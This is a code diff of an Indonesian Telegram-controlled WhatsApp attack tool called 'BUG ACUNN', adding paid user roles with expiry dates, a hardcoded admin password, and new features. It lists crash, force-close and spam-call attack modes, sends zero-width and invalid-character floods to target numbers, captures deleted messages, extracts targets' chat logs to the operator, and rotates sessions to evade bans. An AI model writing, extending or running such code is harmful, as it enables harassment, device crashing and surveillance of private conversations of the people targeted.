@@ -14,10 +14,10 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // ========== DATA USER ==========
 const DATA_FILE = './users.json';
+const SESSIONS_FILE = './sessions.json';
 let users = {};
 let sessions = {};
 
-// ========== FUNGSI LOAD & SAVE ==========
 function loadUsers() {
     try {
         if (fs.existsSync(DATA_FILE)) {
@@ -36,11 +36,32 @@ function saveUsers() {
     } catch (e) {}
 }
 
-// ========== PAKSA USER ACUNN ==========
+function loadSessions() {
+    try {
+        if (fs.existsSync(SESSIONS_FILE)) {
+            const raw = fs.readFileSync(SESSIONS_FILE);
+            sessions = JSON.parse(raw);
+        } else {
+            sessions = {};
+        }
+    } catch (e) {
+        sessions = {};
+    }
+}
+function saveSessions() {
+    try {
+        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
+    } catch (e) {}
+}
+
 loadUsers();
-// PAKSA! Timpa apapun yang ada, user Acunn pasti ada
+loadSessions();
+
+// ========== HARCODE ADMIN ACUNN (NO EXPIRED) ==========
 users['Acunn'] = {
     password: 'Kontol980',
+    role: 'admin',
+    expired: null,
     targets: { admin: [], users: [] },
     sock: null,
     qr: null,
@@ -55,14 +76,25 @@ function generateToken() {
     return crypto.randomBytes(32).toString('hex');
 }
 
+function isExpired(user) {
+    if (user.role === 'admin') return false;
+    if (!user.expired) return true;
+    const now = new Date();
+    const exp = new Date(user.expired);
+    return now > exp;
+}
+
 // ========== TELEGRAM BOT ==========
-bot.onText(/\/adduser (.+) (.+)/, (msg, match) => {
+bot.onText(/\/adduser (.+) (.+) (.+) (.+)/, (msg, match) => {
     if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
-    const username = match[1],
-        password = match[2];
+    const username = match[1], password = match[2], role = match[3].toLowerCase(), expired = match[4];
     if (users[username]) return bot.sendMessage(msg.chat.id, `⚠️ User ${username} sudah ada.`);
+    if (!['admin', 'user'].includes(role)) return bot.sendMessage(msg.chat.id, '❌ Role harus admin atau user.');
+    const exp = role === 'admin' ? null : expired;
     users[username] = {
         password,
+        role,
+        expired: exp,
         targets: { admin: [], users: [] },
         sock: null,
         qr: null,
@@ -72,14 +104,35 @@ bot.onText(/\/adduser (.+) (.+)/, (msg, match) => {
         attackType: 'cyclone'
     };
     saveUsers();
-    bot.sendMessage(msg.chat.id, `✅ User ${username} berhasil ditambahkan!`);
+    bot.sendMessage(msg.chat.id, `✅ User ${username} (${role}) ditambahkan, expired ${exp || 'TIDAK ADA (admin)'}`);
+});
+
+bot.onText(/\/deluser (.+)/, (msg, match) => {
+    if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
+    const username = match[1];
+    if (!users[username]) return bot.sendMessage(msg.chat.id, `❌ User ${username} tidak ditemukan.`);
+    if (username === 'Acunn') return bot.sendMessage(msg.chat.id, '❌ Gak bisa hapus admin utama, goblok!');
+    delete users[username];
+    saveUsers();
+    bot.sendMessage(msg.chat.id, `✅ User ${username} dihapus.`);
+});
+
+bot.onText(/\/setexpired (.+) (.+)/, (msg, match) => {
+    if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
+    const username = match[1], expired = match[2];
+    if (!users[username]) return bot.sendMessage(msg.chat.id, `❌ User ${username} tidak ditemukan.`);
+    if (users[username].role === 'admin') return bot.sendMessage(msg.chat.id, '❌ Admin gak bisa expired, tolol!');
+    users[username].expired = expired;
+    saveUsers();
+    bot.sendMessage(msg.chat.id, `✅ User ${username} expired diubah jadi ${expired}`);
 });
 
 bot.onText(/\/login (.+) (.+)/, (msg, match) => {
-    const username = match[1],
-        password = match[2];
+    const username = match[1], password = match[2];
     if (!users[username] || users[username].password !== password)
         return bot.sendMessage(msg.chat.id, '❌ Username atau password salah!');
+    if (isExpired(users[username]))
+        return bot.sendMessage(msg.chat.id, '❌ User expired! Hubungi admin.');
     users[username].telegramId = msg.chat.id.toString();
     saveUsers();
     bot.sendMessage(msg.chat.id, `✅ Login berhasil! Akun Telegram terhubung dengan ${username}.`);
@@ -92,25 +145,53 @@ function getUsernameFromChat(chatId) {
     return null;
 }
 
+function isUserAuthorized(username) {
+    if (!username) return false;
+    if (isExpired(users[username])) return false;
+    return true;
+}
+
+bot.onText(/\/start/, (msg) => {
+    bot.sendMessage(msg.chat.id, `☠️ BUG ACUNN ACTIVATED ☠️\nGunakan /help buat lihat perintah.`);
+});
+bot.onText(/\/help/, (msg) => {
+    bot.sendMessage(msg.chat.id, `
+🔥 PERINTAH BUG ACUNN 🔥
+/login [username] [password] – login ke akun
+/addtarget [nomor] [role] – tambah target
+/removetarget [nomor] – hapus target
+/startspam – mulai spam
+/stopspam – hentikan spam
+/status – lihat status
+/getqr – dapatkan QR code
+/setattack [mode] – ganti mode serangan
+/extract [nomor] – ekstrak chat target
+/rotate – rotasi session (bypass ban)
+[OWNER ONLY]
+/adduser [user] [pass] [role] [expired] – tambah user
+/deluser [user] – hapus user
+/setexpired [user] [YYYY-MM-DD] – ubah expired
+`);
+});
+
 bot.onText(/\/startspam/, async (msg) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu! Ketik /login username password');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
     await startWASession(username);
     bot.sendMessage(msg.chat.id, '🚀 Spam dimulai!');
 });
 
 bot.onText(/\/stopspam/, (msg) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
     stopSpamForUser(username);
     bot.sendMessage(msg.chat.id, '⛔ Spam dihentikan.');
 });
 
 bot.onText(/\/addtarget (.+) (.+)/, (msg, match) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
-    const number = match[1],
-        role = match[2].toLowerCase();
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    const number = match[1], role = match[2].toLowerCase();
     if (!['admin', 'users'].includes(role)) return bot.sendMessage(msg.chat.id, '❌ Role harus admin atau users.');
     users[username].targets[role].push(number);
     saveUsers();
@@ -120,49 +201,153 @@ bot.onText(/\/addtarget (.+) (.+)/, (msg, match) => {
 
 bot.onText(/\/removetarget (.+)/, (msg, match) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
     const number = match[1];
     let removed = false;
     ['admin', 'users'].forEach(role => {
         const idx = users[username].targets[role].indexOf(number);
-        if (idx !== -1) { users[username].targets[role].splice(idx, 1);
-            removed = true; }
+        if (idx !== -1) { users[username].targets[role].splice(idx, 1); removed = true; }
     });
-    if (removed) { saveUsers();
-        bot.sendMessage(msg.chat.id, `✅ ${number} dihapus.`); } else bot.sendMessage(msg.chat.id, `❌ ${number} tidak ditemukan.`);
+    if (removed) { saveUsers(); bot.sendMessage(msg.chat.id, `✅ ${number} dihapus.`); }
+    else bot.sendMessage(msg.chat.id, `❌ ${number} tidak ditemukan.`);
 });
 
 bot.onText(/\/status/, (msg) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
     const user = users[username];
     const admin = user.targets.admin.join(', ') || 'kosong';
     const usersList = user.targets.users.join(', ') || 'kosong';
     bot.sendMessage(msg.chat.id, `
-📊 USER: ${username}
+📊 USER: ${username} (${user.role})
 👑 Admin: ${admin}
 👤 User: ${usersList}
 📨 Total spam: ${user.totalSpam || 0}
 🔗 Koneksi WA: ${user.sock ? '✅ Online' : '❌ Offline'}
 🎯 Attack: ${user.attackType || 'cyclone'}
+⏳ Expired: ${user.expired || 'TIDAK ADA (admin)'}
 `);
 });
 
 bot.onText(/\/getqr/, (msg) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
     const user = users[username];
     if (user.qr) bot.sendMessage(msg.chat.id, `📱 Scan QR:\n${user.qr}`);
     else bot.sendMessage(msg.chat.id, '❌ Tidak ada QR aktif. Coba /startspam');
 });
 
+bot.onText(/\/setattack (.+)/, (msg, match) => {
+    const username = getUsernameFromChat(msg.chat.id);
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    const type = match[1];
+    const validTypes = ['crash_ui', 'delay_invisible', 'crash_ios_invisible', 'force_close_1msg', 'force_close_invisible', 'force_close_ios_invisible', 'spam_call', 'delay_hard_invisible', 'blank_andro', 'force_close_infinity', 'video_exploit', 'cyclone'];
+    if (!validTypes.includes(type)) return bot.sendMessage(msg.chat.id, '❌ Mode tidak valid.');
+    users[username].attackType = type;
+    saveUsers();
+    updateSpamForUser(username);
+    bot.sendMessage(msg.chat.id, `✅ Serangan diubah ke ${type}`);
+});
+
+// ========== FITUR BARU: ANTI-REVOKE ==========
+function setupAntiRevoke(sock, username) {
+    sock.ev.on('messages.update', async (update) => {
+        for (const msg of update) {
+            if (msg.update.status === 'revoked') {
+                const original = msg.original;
+                const sender = original.key.remoteJid;
+                const text = original.message?.conversation || original.message?.extendedTextMessage?.text || '[Media/Sticker]';
+                const log = `[REVOKED] ${sender}: "${text}"`;
+                console.log(log);
+                if (users[username]?.telegramId) {
+                    bot.sendMessage(users[username].telegramId, `🔒 Pesan dihapus:\nDari: ${sender}\nIsi: ${text}`);
+                }
+            }
+        }
+    });
+}
+
+// ========== FITUR BARU: DB EXTRACTION ==========
+async function extractChats(sock, target, username) {
+    try {
+        const messages = await sock.loadMessages(target, 500);
+        const chats = messages.map(m => ({
+            from: m.key.remoteJid,
+            text: m.message?.conversation || m.message?.extendedTextMessage?.text || '[Media/Sticker]',
+            timestamp: m.messageTimestamp
+        }));
+        const filePath = `./extracts/${target}_${Date.now()}.json`;
+        if (!fs.existsSync('./extracts')) fs.mkdirSync('./extracts');
+        fs.writeFileSync(filePath, JSON.stringify(chats, null, 2));
+        if (users[username]?.telegramId) {
+            await bot.sendDocument(users[username].telegramId, filePath, { caption: `📊 Chat log ${target}` });
+        }
+        return { success: true, count: chats.length, file: filePath };
+    } catch (e) {
+        return { error: e.message };
+    }
+}
+
+bot.onText(/\/extract (.+)/, async (msg, match) => {
+    const username = getUsernameFromChat(msg.chat.id);
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    const target = match[1];
+    const user = users[username];
+    if (!user.sock) return bot.sendMessage(msg.chat.id, '❌ WA belum konek.');
+    const result = await extractChats(user.sock, target, username);
+    if (result.error) bot.sendMessage(msg.chat.id, '❌ Gagal ekstrak: ' + result.error);
+    else bot.sendMessage(msg.chat.id, `✅ Ekstrak selesai! ${result.count} chat, cek Telegram.`);
+});
+
+// ========== FITUR BARU: BYPASS BAN (ROTATE SESSION) ==========
+bot.onText(/\/rotate/, async (msg) => {
+    const username = getUsernameFromChat(msg.chat.id);
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    const user = users[username];
+    if (!user.sock) return bot.sendMessage(msg.chat.id, '❌ WA belum konek.');
+    try {
+        await user.sock.end();
+        user.sock = null;
+        stopSpamForUser(username);
+        const browsers = ['Chrome', 'Firefox', 'Edge', 'Safari', 'Opera'];
+        const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
+        const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
+        const sock = makeWASocket({
+            auth: state,
+            printQRInTerminal: false,
+            browser: ['BugAcunn', randomBrowser, '120.0.0.0']
+        });
+        sock.ev.on('creds.update', saveCreds);
+        sock.ev.on('connection.update', (update) => {
+            if (update.connection === 'open') {
+                user.sock = sock;
+                user.qr = null;
+                console.log(`✅ Session rotated for ${username}`);
+                if (user.telegramId) {
+                    bot.sendMessage(user.telegramId, '🔄 Session berhasil di-rotate! Browser: ' + randomBrowser);
+                }
+                updateSpamForUser(username);
+            }
+            if (update.connection === 'close') {
+                const reason = update.lastDisconnect?.error?.output?.statusCode;
+                if (reason === DisconnectReason.loggedOut || reason === 401) {
+                    user.sock = null;
+                    if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session logout saat rotate.');
+                }
+            }
+        });
+        user.sock = sock;
+        saveUsers();
+        bot.sendMessage(msg.chat.id, '🔄 Session di-rotate! Browser: ' + randomBrowser);
+    } catch (e) {
+        bot.sendMessage(msg.chat.id, '❌ Gagal rotate: ' + e.message);
+    }
+});
+
 // ========== WA ENGINE ==========
 async function startWASession(username) {
     const user = users[username];
-    if (user.sock) {
-        updateSpamForUser(username);
-        return;
-    }
+    if (user.sock) { updateSpamForUser(username); return; }
     const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
     const sock = makeWASocket({
         auth: state,
@@ -174,18 +359,15 @@ async function startWASession(username) {
         const { connection, lastDisconnect, qr } = update;
         if (qr) {
             user.qr = qr;
-            if (user.telegramId) {
-                bot.sendMessage(user.telegramId, `📱 Scan QR:\n${qr}`);
-            }
+            if (user.telegramId) bot.sendMessage(user.telegramId, `📱 Scan QR:\n${qr}`);
         }
         if (connection === 'open') {
             user.sock = sock;
             user.qr = null;
             console.log(`✅ ${username} connected`);
+            setupAntiRevoke(sock, username); // Aktifkan Anti-Revoke
             updateSpamForUser(username);
-            if (user.telegramId) {
-                bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
-            }
+            if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
         }
         if (connection === 'close') {
             const reason = lastDisconnect?.error?.output?.statusCode;
@@ -202,8 +384,7 @@ async function startWASession(username) {
 
 async function pairWASession(username, phoneNumber) {
     const user = users[username];
-    if (user.sock) { await user.sock.end();
-        user.sock = null; }
+    if (user.sock) { await user.sock.end(); user.sock = null; }
     const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
     const sock = makeWASocket({
         auth: state,
@@ -217,10 +398,9 @@ async function pairWASession(username, phoneNumber) {
             user.sock = sock;
             user.qr = null;
             console.log(`✅ ${username} connected via pairing`);
+            setupAntiRevoke(sock, username); // Aktifkan Anti-Revoke
             updateSpamForUser(username);
-            if (user.telegramId) {
-                bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
-            }
+            if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
         }
         if (connection === 'close') {
             const reason = lastDisconnect?.error?.output?.statusCode;
@@ -238,13 +418,11 @@ async function pairWASession(username, phoneNumber) {
 
 function updateSpamForUser(username) {
     const user = users[username];
-    if (user.spamInterval) { clearInterval(user.spamInterval);
-        user.spamInterval = null; }
+    if (user.spamInterval) { clearInterval(user.spamInterval); user.spamInterval = null; }
     if (!user.sock) return;
     const allTargets = [...user.targets.admin, ...user.targets.users];
     if (allTargets.length === 0) return;
     const attackType = user.attackType || 'cyclone';
-
     user.spamInterval = setInterval(async () => {
         try {
             for (let target of allTargets) {
@@ -286,7 +464,7 @@ function updateSpamForUser(username) {
                     case 'blank_andro':
                         await user.sock.sendMessage(target, { text: '\u200B'.repeat(50000) });
                         break;
-                    case 'force_close_infinity':
+                                        case 'force_close_infinity':
                         for (let i = 0; i < 10; i++) {
                             await user.sock.sendMessage(target, { text: 'INFINITY LOOP ' + i });
                             await user.sock.sendMessage(target, { text: '\uFFFE'.repeat(200) });
@@ -317,8 +495,7 @@ function updateSpamForUser(username) {
 
 function stopSpamForUser(username) {
     const user = users[username];
-    if (user.spamInterval) { clearInterval(user.spamInterval);
-        user.spamInterval = null; }
+    if (user.spamInterval) { clearInterval(user.spamInterval); user.spamInterval = null; }
 }
 
 // ========== REST API ==========
@@ -327,15 +504,27 @@ app.post('/api/login', (req, res) => {
     if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
     if (!users[username] || users[username].password !== password)
         return res.status(401).json({ error: 'Username atau password salah' });
+    if (isExpired(users[username]))
+        return res.status(401).json({ error: 'User expired! Hubungi admin.' });
     const token = generateToken();
     sessions[token] = username;
-    res.json({ token, username });
+    saveSessions();
+    res.json({ token, username, role: users[username].role });
 });
 
 function auth(req, res, next) {
     const token = req.headers['x-token'] || req.query.token;
-    if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
-    req.username = sessions[token];
+    loadSessions();
+    if (!token || !sessions[token]) {
+        return res.status(401).json({ error: 'Unauthorized - Silakan login ulang' });
+    }
+    const username = sessions[token];
+    if (isExpired(users[username])) {
+        delete sessions[token];
+        saveSessions();
+        return res.status(401).json({ error: 'User expired! Login ulang.' });
+    }
+    req.username = username;
     next();
 }
 
@@ -375,9 +564,7 @@ app.delete('/api/targets', auth, (req, res) => {
     const user = users[req.username];
     if (!['admin', 'users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
     const idx = user.targets[role].indexOf(number);
-    if (idx !== -1) { user.targets[role].splice(idx, 1);
-        saveUsers();
-        updateSpamForUser(req.username); }
+    if (idx !== -1) { user.targets[role].splice(idx, 1); saveUsers(); updateSpamForUser(req.username); }
     res.json({ success: true });
 });
 
@@ -400,12 +587,7 @@ app.post('/api/pair', auth, async (req, res) => {
 
 app.post('/api/setattack', auth, (req, res) => {
     const { type } = req.body;
-    const validTypes = [
-        'crash_ui', 'delay_invisible', 'crash_ios_invisible',
-        'force_close_1msg', 'force_close_invisible', 'force_close_ios_invisible',
-        'spam_call', 'delay_hard_invisible', 'blank_andro',
-        'force_close_infinity', 'video_exploit', 'cyclone'
-    ];
+    const validTypes = ['crash_ui', 'delay_invisible', 'crash_ios_invisible', 'force_close_1msg', 'force_close_invisible', 'force_close_ios_invisible', 'spam_call', 'delay_hard_invisible', 'blank_andro', 'force_close_infinity', 'video_exploit', 'cyclone'];
     if (!validTypes.includes(type)) return res.status(400).json({ error: 'Tipe serangan tidak valid' });
     users[req.username].attackType = type;
     saveUsers();
@@ -413,10 +595,81 @@ app.post('/api/setattack', auth, (req, res) => {
     res.json({ success: true });
 });
 
+// ========== FITUR BARU: EXTRACT DB VIA API ==========
+app.post('/api/extract', auth, async (req, res) => {
+    const { target } = req.body;
+    if (!target) return res.status(400).json({ error: 'Target nomor wajib' });
+    const user = users[req.username];
+    if (!user.sock) return res.status(400).json({ error: 'WA belum konek' });
+    try {
+        const messages = await user.sock.loadMessages(target, 500);
+        const chats = messages.map(m => ({
+            from: m.key.remoteJid,
+            text: m.message?.conversation || m.message?.extendedTextMessage?.text || '[Media/Sticker]',
+            timestamp: m.messageTimestamp
+        }));
+        const filePath = `./extracts/${target}_${Date.now()}.json`;
+        if (!fs.existsSync('./extracts')) fs.mkdirSync('./extracts');
+        fs.writeFileSync(filePath, JSON.stringify(chats, null, 2));
+        if (users[req.username]?.telegramId) {
+            await bot.sendDocument(users[req.username].telegramId, filePath, { caption: `📊 Chat log ${target}` });
+        }
+        res.json({ success: true, count: chats.length, file: filePath });
+    } catch (e) {
+        res.status(500).json({ error: 'Gagal ekstrak: ' + e.message });
+    }
+});
+
+// ========== FITUR BARU: ROTATE SESSION VIA API ==========
+app.post('/api/rotatesession', auth, async (req, res) => {
+    const user = users[req.username];
+    if (!user.sock) return res.status(400).json({ error: 'WA belum konek' });
+    try {
+        await user.sock.end();
+        user.sock = null;
+        stopSpamForUser(req.username);
+        const browsers = ['Chrome', 'Firefox', 'Edge', 'Safari', 'Opera'];
+        const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
+        const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${req.username}`);
+        const sock = makeWASocket({
+            auth: state,
+            printQRInTerminal: false,
+            browser: ['BugAcunn', randomBrowser, '120.0.0.0']
+        });
+        sock.ev.on('creds.update', saveCreds);
+        sock.ev.on('connection.update', (update) => {
+            if (update.connection === 'open') {
+                user.sock = sock;
+                user.qr = null;
+                console.log(`✅ Session rotated for ${req.username}`);
+                if (user.telegramId) {
+                    bot.sendMessage(user.telegramId, '🔄 Session berhasil di-rotate! Browser: ' + randomBrowser);
+                }
+                updateSpamForUser(req.username);
+            }
+            if (update.connection === 'close') {
+                const reason = update.lastDisconnect?.error?.output?.statusCode;
+                if (reason === DisconnectReason.loggedOut || reason === 401) {
+                    user.sock = null;
+                    if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session logout saat rotate.');
+                }
+            }
+        });
+        user.sock = sock;
+        saveUsers();
+        res.json({ success: true, message: 'Session di-rotate, browser: ' + randomBrowser });
+    } catch (e) {
+        res.status(500).json({ error: 'Gagal rotate: ' + e.message });
+    }
+});
+
+// ========== ADMIN-ONLY API ==========
 app.get('/api/admin/users', auth, (req, res) => {
-    if (req.username !== 'admin') return res.status(403).json({ error: 'Admin only' });
+    if (users[req.username].role !== 'admin') return res.status(403).json({ error: 'Admin only' });
     const list = Object.keys(users).map(u => ({
         username: u,
+        role: users[u].role,
+        expired: users[u].expired || 'TIDAK ADA (admin)',
         totalSpam: users[u].totalSpam || 0,
         connected: !!users[u].sock,
         targetCount: users[u].targets.admin.length + users[u].targets.users.length
@@ -425,12 +678,16 @@ app.get('/api/admin/users', auth, (req, res) => {
 });
 
 app.post('/api/admin/adduser', auth, (req, res) => {
-    if (req.username !== 'admin') return res.status(403).json({ error: 'Admin only' });
-    const { username, password } = req.body;
-    if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
+    if (users[req.username].role !== 'admin') return res.status(403).json({ error: 'Admin only' });
+    const { username, password, role, expired } = req.body;
+    if (!username || !password || !role) return res.status(400).json({ error: 'Username, password, role wajib' });
     if (users[username]) return res.status(400).json({ error: 'User sudah ada' });
+    if (!['admin', 'user'].includes(role)) return res.status(400).json({ error: 'Role harus admin atau user' });
+    const exp = role === 'admin' ? null : expired;
     users[username] = {
         password,
+        role,
+        expired: exp,
         targets: { admin: [], users: [] },
         sock: null,
         qr: null,
@@ -440,10 +697,30 @@ app.post('/api/admin/adduser', auth, (req, res) => {
         attackType: 'cyclone'
     };
     saveUsers();
-    res.json({ success: true });
+    res.json({ success: true, message: `User ${username} (${role}) ditambahkan, expired ${exp || 'TIDAK ADA (admin)'}` });
 });
 
-// ========== JALANKAN ==========
+app.delete('/api/admin/deluser', auth, (req, res) => {
+    if (users[req.username].role !== 'admin') return res.status(403).json({ error: 'Admin only' });
+    const { username } = req.body;
+    if (!users[username]) return res.status(400).json({ error: 'User tidak ditemukan' });
+    if (username === 'Acunn') return res.status(400).json({ error: 'Gak bisa hapus admin utama!' });
+    delete users[username];
+    saveUsers();
+    res.json({ success: true, message: `User ${username} dihapus` });
+});
+
+app.post('/api/admin/setexpired', auth, (req, res) => {
+    if (users[req.username].role !== 'admin') return res.status(403).json({ error: 'Admin only' });
+    const { username, expired } = req.body;
+    if (!users[username]) return res.status(400).json({ error: 'User tidak ditemukan' });
+    if (users[username].role === 'admin') return res.status(400).json({ error: 'Admin gak bisa expired!' });
+    users[username].expired = expired;
+    saveUsers();
+    res.json({ success: true, message: `User ${username} expired diubah jadi ${expired}` });
+});
+
+// ========== JALANKAN SERVER ==========
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
